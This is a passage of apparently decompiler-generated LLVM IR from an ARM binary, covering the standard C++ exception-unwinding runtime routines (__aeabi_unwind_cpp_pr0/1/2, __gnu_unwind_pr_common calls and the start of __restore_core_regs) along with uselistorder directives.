dec_label_pc_19bf4:                               ; preds = %dec_label_pc_19be8
  %v2_19bf4 = icmp eq i32 %v0_19bf4, 0
  br i1 %v2_19bf4, label %dec_label_pc_19c60, label %dec_label_pc_19bfc

dec_label_pc_19bfc:                               ; preds = %dec_label_pc_19bf4
  %v0_19bfc = load i32, i32* @r7, align 4
  %v1_19bfc = add i32 %v0_19bfc, 4
  %v2_19bfc = inttoptr i32 %v1_19bfc to i32*
  %v3_19bfc = load i32, i32* %v2_19bfc, align 4
  %v7_19c00 = icmp eq i32 %v3_19bfc, -2
  store i32 %v1_19bfc, i32* %r2.global-to-local, align 4
  br i1 %v7_19c00, label %dec_label_pc_19b18, label %dec_label_pc_19c0c

dec_label_pc_19c0c:                               ; preds = %dec_label_pc_19bfc
  %v0_19c0c = load i32, i32* @r8, align 4
  %v1_19c0c = add i32 %v0_19c0c, 88
  %v7_19c10 = icmp eq i32 %v3_19bfc, -1
  store i32 %v1_19c0c, i32* %forced_unwind_-44, align 4
  br i1 %v7_19c10, label %dec_label_pc_19c54, label %dec_label_pc_19c1c

dec_label_pc_19c1c:                               ; preds = %dec_label_pc_19c0c
  %v2_19c20 = icmp eq i32 %v3_19bfc, 0
  br i1 %v2_19c20, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_19c1c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_19c1c, %bb162
  store i32 %v0_19c0c, i32* %r0.global-to-local, align 4
  store i32 %v2_19c30, i32* %r2.global-to-local, align 4
  %v4_19c3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 100) to i32*), align 4
  store i32 105544, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19c3c)
  %v0_19c48 = load i32, i32* %r0.global-to-local, align 4
  %v2_19c48 = icmp eq i32 %v0_19c48, 0
  br i1 %v2_19c48, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_19c54.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19c54

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19c60

dec_label_pc_19c54:                               ; preds = %.thread25, %dec_label_pc_19c0c
  %v3_19c54 = phi i32 [ %v3_19c54.pr, %.thread25 ], [ %v1_19c0c, %dec_label_pc_19c0c ]
  %v2_19c58 = icmp eq i32 %v3_19c54, 0
  br i1 %v2_19c58, label %dec_label_pc_19c60, label %dec_label_pc_19db8

dec_label_pc_19c60:                               ; preds = %bb164, %dec_label_pc_19d0c, %dec_label_pc_19ce0, %dec_label_pc_19c54, %dec_label_pc_19bf4
  %v0_19c60 = load i32, i32* @r7, align 4
  %v1_19c60 = add i32 %v0_19c60, 8
  %v1_199c8 = inttoptr i32 %v1_19c60 to i32*
  %v2_199c8 = load i32, i32* %v1_199c8, align 4
  %v2_199cc = icmp eq i32 %v2_199c8, 0
  br i1 %v2_199cc, label %dec_label_pc_19a88, label %dec_label_pc_199d4.preheader

dec_label_pc_19c68:                               ; preds = %entry
  %v3_19c68 = udiv i32 %v2_1995c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_19c78 = mul nuw nsw i32 %v3_19c68, 4
  %v3_19c7c = mul i32 %v2_1995c, 65536
  %v2_19c80 = add i32 %v6_19c78, %v4_1995c
  store i32 %v3_19c7c, i32* %v4_1997c, align 8
  br label %dec_label_pc_199a4

dec_label_pc_19c90:                               ; preds = %bb159, %dec_label_pc_19b3c
  %v1_19c90 = add i32 %v0_19b2c, 4
  br label %dec_label_pc_19c94

dec_label_pc_19c94:                               ; preds = %dec_label_pc_19cd4, %dec_label_pc_19c90
  %v0_19c94 = phi i32 [ %v2_19cd4, %dec_label_pc_19cd4 ], [ %v2_19b2c, %dec_label_pc_19c90 ]
  %storemerge = phi i32 [ %v4_19cd4, %dec_label_pc_19cd4 ], [ %v1_19c90, %dec_label_pc_19c90 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_19c94 = icmp slt i32 %v0_19c94, 0
  br i1 %v1_19c94, label %dec_label_pc_19bdc, label %dec_label_pc_19c9c

dec_label_pc_19c9c:                               ; preds = %dec_label_pc_19bd0, %dec_label_pc_19c94, %dec_label_pc_19da8, %dec_label_pc_19bdc
  %v0_19ca0 = phi i32 [ %v1_19be0, %dec_label_pc_19bdc ], [ %storemerge, %dec_label_pc_19c94 ], [ %v1_19dac, %dec_label_pc_19da8 ], [ %v0_19bdc.pre, %dec_label_pc_19bd0 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_19bdc ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19c94 ], [ %v1_19da8, %dec_label_pc_19da8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19bd0 ]
  %v0_19c9c = load i32, i32* @sl, align 4
  %v3_19c9c = mul i32 %v0_19c9c, 4
  %v2_19ca0 = add i32 %v3_19c9c, %v0_19ca0
  %v1_199c865 = inttoptr i32 %v2_19ca0 to i32*
  %v2_199c866 = load i32, i32* %v1_199c865, align 4
  %v2_199cc68 = icmp eq i32 %v2_199c866, 0
  br i1 %v2_199cc68, label %dec_label_pc_19a88, label %dec_label_pc_199d4.preheader.lr.ph

dec_label_pc_19ca8:                               ; preds = %dec_label_pc_19b28
  %v0_19cb8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19cb8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19cc0 = load i32, i32* @r8, align 4
  %v1_19cc0 = add i32 %v0_19cc0, 32
  %v2_19cc0 = inttoptr i32 %v1_19cc0 to i32*
  %v3_19cc0 = load i32, i32* %v2_19cc0, align 4
  store i32 %v3_19cc0, i32* @r4, align 4
  %v5_19cc4 = call i32 @_Unwind_VRS_Get(i32 %v0_19cb8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19cc4, i32* %r0.global-to-local, align 4
  %v3_19cc8 = load i32, i32* %stack_var_-48, align 4
  %v0_19ccc = load i32, i32* @r4, align 4
  %v9_19ccc = icmp eq i32 %v0_19ccc, %v3_19cc8
  br i1 %v9_19ccc, label %dec_label_pc_19d74, label %dec_label_pc_19ca8.dec_label_pc_19cd4_crit_edge

dec_label_pc_19ca8.dec_label_pc_19cd4_crit_edge:  ; preds = %dec_label_pc_19ca8
  %v0_19cd4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19cd4

dec_label_pc_19cd4:                               ; preds = %dec_label_pc_19ca8.dec_label_pc_19cd4_crit_edge, %dec_label_pc_19d74
  %v0_19cd4 = phi i32 [ %v0_19cd4.pre, %dec_label_pc_19ca8.dec_label_pc_19cd4_crit_edge ], [ %v1_19d78, %dec_label_pc_19d74 ]
  %v1_19cd4 = inttoptr i32 %v0_19cd4 to i32*
  %v2_19cd4 = load i32, i32* %v1_19cd4, align 4
  %v4_19cd4 = add i32 %v0_19cd4, 4
  store i32 %v4_19cd4, i32* @r7, align 4
  br label %dec_label_pc_19c94

dec_label_pc_19ce0:                               ; preds = %dec_label_pc_19be8
  %v0_19cf0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19cf0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19cf8 = load i32, i32* @r8, align 4
  %v1_19cf8 = add i32 %v0_19cf8, 32
  %v2_19cf8 = inttoptr i32 %v1_19cf8 to i32*
  %v3_19cf8 = load i32, i32* %v2_19cf8, align 4
  store i32 %v3_19cf8, i32* @r4, align 4
  %v5_19cfc = call i32 @_Unwind_VRS_Get(i32 %v0_19cf0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19cfc, i32* %r0.global-to-local, align 4
  %v3_19d00 = load i32, i32* %stack_var_-48, align 4
  %v0_19d04 = load i32, i32* @r4, align 4
  %v9_19d04 = icmp eq i32 %v0_19d04, %v3_19d00
  br i1 %v9_19d04, label %dec_label_pc_19d0c, label %dec_label_pc_19c60

dec_label_pc_19d0c:                               ; preds = %dec_label_pc_19ce0
  %v0_19d0c = load i32, i32* @r8, align 4
  %v1_19d0c = add i32 %v0_19d0c, 40
  %v2_19d0c = inttoptr i32 %v1_19d0c to i32*
  %v3_19d0c = load i32, i32* %v2_19d0c, align 4
  %v1_19d10 = load i32, i32* @r7, align 4
  %v9_19d10 = icmp eq i32 %v3_19d0c, %v1_19d10
  br i1 %v9_19d10, label %dec_label_pc_19d18, label %dec_label_pc_19c60

dec_label_pc_19d18:                               ; preds = %dec_label_pc_19d0c
  %v1_19d18 = inttoptr i32 %v3_19d0c to i32*
  %v2_19d18 = load i32, i32* %v1_19d18, align 4
  %v1_19d1c = and i32 %v2_19d18, 1073741824
  %v2_19d1c = icmp eq i32 %v1_19d1c, 0
  br i1 %v2_19d1c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_19d18
  %v2_19d20 = or i32 %v2_19d18, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_19d18
  %tmp208 = bitcast i32 %v2_19d18 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_19d24 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_19d28 = phi i32 [ %v2_19e58, %.thread28 ], [ %v2_19e58, %bb169 ], [ %v3_19d0c, %bb165 ], [ %v3_19d0c, %.thread26 ]
  %v0_19d28 = phi i32 [ %v2_19e68, %.thread28 ], [ %v2_19e64, %bb169 ], [ %v2_19d20, %bb165 ], [ %v2_19d24, %.thread26 ]
  %v2_19d28 = add i32 %v0_19d28, %v1_19d28
  store i32 %v2_19d28, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19d40 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19d40, i32* %r0.global-to-local, align 4
  %v5_19d48 = call i32 @_Unwind_VRS_Set(i32 %v0_19d40, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_19d40, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19d60 = load i32, i32* @r8, align 4
  store i32 %v0_19d60, i32* %stack_var_-48, align 4
  %v5_19d68 = call i32 @_Unwind_VRS_Set(i32 %v0_19d40, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b1c

dec_label_pc_19d74:                               ; preds = %dec_label_pc_19ca8
  %v0_19d74 = load i32, i32* @r8, align 4
  %v1_19d74 = add i32 %v0_19d74, 40
  %v2_19d74 = inttoptr i32 %v1_19d74 to i32*
  %v3_19d74 = load i32, i32* %v2_19d74, align 4
  %v1_19d78 = load i32, i32* @r7, align 4
  %v9_19d78 = icmp eq i32 %v3_19d74, %v1_19d78
  br i1 %v9_19d78, label %dec_label_pc_19d80, label %dec_label_pc_19cd4

dec_label_pc_19d80:                               ; preds = %dec_label_pc_19d74
  %v1_19d84 = add i32 %v3_19d74, 4
  store i32 %v1_19d84, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_19d8c = add i32 %v0_19d74, 44
  %v3_19d8c = inttoptr i32 %v2_19d8c to i32*
  store i32 0, i32* %v3_19d8c, align 4
  %v0_19d90 = load i32, i32* %r2.global-to-local, align 4
  %v1_19d90 = load i32, i32* @r8, align 4
  %v2_19d90 = add i32 %v1_19d90, 48
  %v3_19d90 = inttoptr i32 %v2_19d90 to i32*
  store i32 %v0_19d90, i32* %v3_19d90, align 4
  %v0_19d94 = load i32, i32* @sl, align 4
  %v1_19d94 = load i32, i32* @r8, align 4
  %v2_19d94 = add i32 %v1_19d94, 40
  %v3_19d94 = inttoptr i32 %v2_19d94 to i32*
  store i32 %v0_19d94, i32* %v3_19d94, align 4
  %v0_19d98 = load i32, i32* %r0.global-to-local, align 4
  %v1_19d98 = load i32, i32* @r8, align 4
  %v2_19d98 = add i32 %v1_19d98, 52
  %v3_19d98 = inttoptr i32 %v2_19d98 to i32*
  store i32 %v0_19d98, i32* %v3_19d98, align 4
  %v0_19d9c = load i32, i32* @r7, align 4
  %v1_19d9c = inttoptr i32 %v0_19d9c to i32*
  %v2_19d9c = load i32, i32* %v1_19d9c, align 4
  %v1_19da0 = icmp slt i32 %v2_19d9c, 0
  br i1 %v1_19da0, label %dec_label_pc_19da8, label %dec_label_pc_19e54

dec_label_pc_19da8:                               ; preds = %dec_label_pc_19d80
  %v0_19da8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19da8 = add i32 %v0_19da8, -3
  store i32 %v1_19da8, i32* %r2.global-to-local, align 4
  %v0_19dac = load i32, i32* %r0.global-to-local, align 4
  %v1_19dac = add i32 %v0_19dac, 4
  store i32 %v1_19dac, i32* @r6, align 4
  br label %dec_label_pc_19c9c

dec_label_pc_19db8:                               ; preds = %dec_label_pc_19bc8, %dec_label_pc_19c54, %dec_label_pc_19b80, %dec_label_pc_19b54.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19dc8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19dc8, i32* %r0.global-to-local, align 4
  %v5_19dd0 = call i32 @_Unwind_VRS_Get(i32 %v0_19dc8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19dd4 = load i32, i32* @r7, align 4
  %v1_19dd4 = load i32, i32* @r8, align 4
  %v2_19dd4 = add i32 %v1_19dd4, 40
  %v3_19dd4 = inttoptr i32 %v2_19dd4 to i32*
  store i32 %v0_19dd4, i32* %v3_19dd4, align 4
  %v3_19dd8 = load i32, i32* %stack_var_-48, align 4
  %v3_19ddc = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_19ddc, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19de4 = load i32, i32* @r8, align 4
  %v2_19de4 = add i32 %v1_19de4, 32
  %v3_19de4 = inttoptr i32 %v2_19de4 to i32*
  store i32 %v3_19dd8, i32* %v3_19de4, align 4
  %v0_19de8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19de8 = load i32, i32* @r8, align 4
  %v2_19de8 = add i32 %v1_19de8, 36
  %v3_19de8 = inttoptr i32 %v2_19de8 to i32*
  store i32 %v0_19de8, i32* %v3_19de8, align 4
  %v1_19b24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b1c

dec_label_pc_19df0:                               ; preds = %bb155
  %v1_19df0 = inttoptr i32 %v0_19a78 to i32*
  %v2_19df0 = load i32, i32* %v1_19df0, align 4
  %v1_19df4 = add i32 %v0_19a78, 4
  %v1_19df8 = and i32 %v2_19df0, 1073741824
  %v2_19df8 = icmp eq i32 %v1_19df8, 0
  %v2_19dfc = or i32 %v2_19df0, -2147483648
  %tmp210 = bitcast i32 %v2_19df0 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19e00 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19df8, i32 %v2_19e00, i32 %v2_19dfc
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19e04 = load i32, i32* @r8, align 4
  %v2_19e04 = add i32 %v1_19e04, 56
  %v3_19e04 = inttoptr i32 %v2_19e04 to i32*
  store i32 %v1_19df4, i32* %v3_19e04, align 4
  %v0_19e08 = load i32, i32* @r8, align 4
  store i32 %v0_19e08, i32* %r0.global-to-local, align 4
  %v4_19e14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 28) to i32*), align 4
  store i32 106016, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19e14)
  %v0_19e20 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e20 = icmp eq i32 %v0_19e20, 0
  br i1 %v2_19e20, label %dec_label_pc_19b18, label %dec_label_pc_19e28

dec_label_pc_19e28:                               ; preds = %dec_label_pc_19df0
  %v0_19e28 = load i32, i32* %r4.global-to-local, align 4
  %v1_19e28 = load i32, i32* @r7, align 4
  %v2_19e28 = add i32 %v1_19e28, %v0_19e28
  store i32 %v2_19e28, i32* %stack_var_-48, align 4
  %v0_19e38 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19e38, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_19e48 = call i32 @_Unwind_VRS_Set(i32 %v0_19e38, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b1c

dec_label_pc_19e54:                               ; preds = %dec_label_pc_19d80
  %v0_19e54 = load i32, i32* @sl, align 4
  %v3_19e54 = mul i32 %v0_19e54, 4
  %v0_19e58 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e58 = add i32 %v0_19e58, %v3_19e54
  %v3_19e58 = inttoptr i32 %v2_19e58 to i32*
  %v4_19e58 = load i32, i32* %v3_19e58, align 4
  %v1_19e5c = and i32 %v4_19e58, 1073741824
  %v2_19e5c = icmp eq i32 %v1_19e5c, 0
  br i1 %v2_19e5c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_19e54
  %v2_19e64 = or i32 %v4_19e58, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_19e54
  %tmp212 = bitcast i32 %v4_19e58 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_19e68 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_19e58, { 2, 1, 0 }
  uselistorder i32 %v1_19dac, { 1, 0 }
  uselistorder i32 %v1_19da8, { 1, 0 }
  uselistorder i32 %v1_19d78, { 1, 0 }
  uselistorder i32 %v0_19d40, { 1, 0, 2, 3 }
  uselistorder i32 %v3_19d0c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19cd4, { 1, 0 }
  uselistorder i32 %v0_19cd4, { 1, 0 }
  uselistorder i32 %v2_199c866, { 1, 0 }
  uselistorder i32 %v2_19ca0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_199c8, { 1, 0 }
  uselistorder i32 %v1_19c60, { 1, 0 }
  uselistorder i32 %v3_19bfc, { 2, 0, 1 }
  uselistorder i32 %v0_19bdc, { 1, 0 }
  uselistorder i32 %v0_19bdc.pre, { 1, 0 }
  uselistorder i32 %v1_19b34, { 1, 0 }
  uselistorder i32 %v2_19b2c, { 1, 0 }
  uselistorder i32 %v0_19abc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_19a7c, { 1, 0 }
  uselistorder i32 %v1_19a78, { 1, 0 }
  uselistorder i32 %v0_19a78, { 1, 0, 2 }
  uselistorder i32 %v4_19a50, { 0, 2, 1, 3 }
  uselistorder i32 %v0_19bf4, { 1, 2, 0 }
  uselistorder i32 %v0_19a28, { 1, 0 }
  uselistorder i32 %v3_19a24, { 1, 0, 2 }
  uselistorder i32 %v1_199f8, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_19c30, { 1, 0 }
  uselistorder i1 %v2_19a64, { 1, 0, 2 }
  uselistorder i32 %v1_19968, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 78, 0, 15, 16, 77, 17, 37, 38, 18, 36, 4, 39, 19, 40, 1, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 29, 6, 30, 41, 42, 43, 7, 44, 45, 46, 47, 8, 48, 49, 50, 51, 9, 52, 10, 53, 54, 31, 55, 11, 56, 57, 58, 32, 59, 12, 60, 61, 33, 62, 63, 64, 65, 66, 34, 67, 13, 68, 69, 70, 71, 72, 73, 35, 74, 14, 75, 5, 76, 3 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 27, 1, 2, 4, 13, 14, 10, 11, 12, 15, 17, 16, 5, 20, 21, 3, 22, 0, 23, 24, 6, 7, 18, 19, 8, 25, 9, 26 }
  uselistorder i32 48, { 24, 2, 0, 9, 7, 8, 13, 14, 10, 11, 17, 18, 19, 15, 20, 4, 12, 16, 1, 5, 21, 3, 22, 6, 23 }
  uselistorder i32 44, { 46, 2, 47, 48, 0, 16, 3, 17, 4, 5, 6, 27, 28, 29, 30, 31, 32, 24, 25, 26, 7, 22, 23, 8, 1, 9, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 10, 11, 12, 18, 19, 20, 21, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 -2147483648, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 143, 28, 29, 30, 31, 32, 33, 34, 35, 36, 142, 37, 38, 39, 2, 40, 0, 3, 41, 42, 44, 43, 1, 47, 45, 46, 48, 54, 49, 55, 50, 56, 51, 52, 53, 58, 59, 60, 61, 57, 141, 63, 62, 65, 64, 67, 68, 69, 66, 70, 72, 73, 74, 71, 75, 76, 78, 79, 77, 80, 81, 84, 82, 85, 83, 87, 88, 89, 86, 90, 95, 91, 96, 92, 97, 93, 94, 99, 100, 101, 98, 102, 103, 104, 105, 107, 106, 108, 116, 109, 117, 110, 118, 111, 119, 112, 120, 113, 114, 115, 122, 123, 124, 125, 121, 126, 131, 127, 132, 128, 129, 130, 134, 136, 137, 138, 133, 135, 140, 139 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_23378.488 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 15, 27, 68, 86, 69, 87, 16, 17, 70, 71, 72, 88, 18, 89, 90, 91, 19, 92, 20, 73, 93, 94, 21, 22, 23, 95, 74, 96, 24, 97, 25, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 104, 105, 34, 33, 35, 106, 107, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 108, 5, 109, 110, 111, 112, 113, 32, 76, 114, 81 }
  uselistorder i32 -2, { 0, 33, 34, 6, 3, 4, 2, 7, 8, 9, 1, 5, 29, 28, 30, 31, 32, 21, 22, 23, 24, 25, 26, 27, 10, 11, 12, 13, 14, 20, 19, 18, 17, 16, 15 }
  uselistorder i32 80, { 15, 16, 17, 1, 3, 2, 4, 5, 6, 12, 7, 8, 11, 9, 10, 13, 0, 14 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19db8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19cd4, { 1, 0 }
  uselistorder label %dec_label_pc_19c9c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19c60, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_19bdc, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_19b1c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_19b18, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19a78, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_199d4, { 1, 0 }
  uselistorder label %dec_label_pc_199d4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_199d4.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_19e74(i32 %arg1) local_unnamed_addr {
dec_label_pc_19e74:
  %v0_19e74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19e74, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19e74
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19e74, %bb
  %v10_19e7c = phi i32 [ %arg1, %dec_label_pc_19e74 ], [ 0, %bb ]
  ret i32 %v10_19e7c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 27, 28, 29, 49, 19, 26, 50, 51, 52, 53, 54, 5, 4, 55, 42, 43, 30, 31, 20, 34, 33, 32, 35, 6, 8, 44, 21, 22, 7, 16, 9, 38, 17, 15, 18, 10, 11, 12, 36, 13, 14, 39, 45, 46, 47, 24, 48, 23, 25, 41, 37, 40, 56, 57 }
  uselistorder i1* @cpsr_z, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 41, 13, 14, 15, 34, 35, 36, 37, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 38, 39, 40, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19e84 = load i32, i32* @r1, align 4
  %v2_19e84 = load i32, i32* @r2, align 4
  %v4_19e84 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_19e84, i32 %v2_19e84, i32 2)
  ret i32 %v4_19e84
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19e8c = load i32, i32* @r1, align 4
  %v2_19e8c = load i32, i32* @r2, align 4
  %v4_19e8c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_19e8c, i32 %v2_19e8c, i32 1)
  ret i32 %v4_19e8c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19e94 = load i32, i32* @r1, align 4
  %v2_19e94 = load i32, i32* @r2, align 4
  %v4_19e94 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_19e94, i32 %v2_19e94, i32 0)
  ret i32 %v4_19e94

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 8, 9, 10, 55, 11, 0, 20, 12, 21, 56, 57, 58, 16, 17, 18, 19, 34, 35, 36, 37, 59, 60, 61, 72, 73, 74, 75, 64, 1, 65, 62, 63, 2, 3, 4, 42, 43, 5, 6, 66, 67, 68, 69, 70, 71, 38, 44, 45, 46, 22, 13, 14, 15, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 7, 39, 40, 41, 47, 48, 49, 50, 51, 52, 53, 54 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_19e9c = add i32 %tmp, 56
  %v4_19e9c = inttoptr i32 %v3_19e9c to i32*
  %v5_19e9c = load i32, i32* %v4_19e9c, align 4
  %v6_19e9c = add i32 %tmp, 60
  %v7_19e9c = inttoptr i32 %v6_19e9c to i32*
  %v8_19e9c = load i32, i32* %v7_19e9c, align 4
  %v2_19ea8 = load i32, i32* %arg1, align 4
  %v3_19ea8 = add i32 %tmp, 4
  %v4_19ea8 = inttoptr i32 %v3_19ea8 to i32*
  %v5_19ea8 = load i32, i32* %v4_19ea8, align 4
  store i32 %v5_19ea8, i32* @r1, align 4
  %v12_19ea8 = add i32 %tmp, 16
  %v13_19ea8 = inttoptr i32 %v12_19ea8 to i32*
  %v14_19ea8 = load i32, i32* %v13_19ea8, align 4
  store i32 %v14_19ea8, i32* @r4, align 4
  %v15_19ea8 = add i32 %tmp, 20
  %v16_19ea8 = inttoptr i32 %v15_19ea8 to i32*
  %v17_19ea8 = load i32, i32* %v16_19ea8, align 4
  store i32 %v17_19ea8, i32* @r5, align 4
  %v18_19ea8 = add i32 %tmp, 24
  %v19_19ea8 = inttoptr i32 %v18_19ea8 to i32*
  %v20_19ea8 = load i32, i32* %v19_19ea8, align 4
  store i32 %v20_19ea8, i32* @r6, align 4
  %v21_19ea8 = add i32 %tmp, 28
  %v22_19ea8 = inttoptr i32 %v21_19ea8 to i32*
  %v23_19ea8 = load i32, i32* %v22_19ea8, align 4
  store i32 %v23_19ea8, i32* @r7, align 4
  %v24_19ea8 = add i32 %tmp, 32
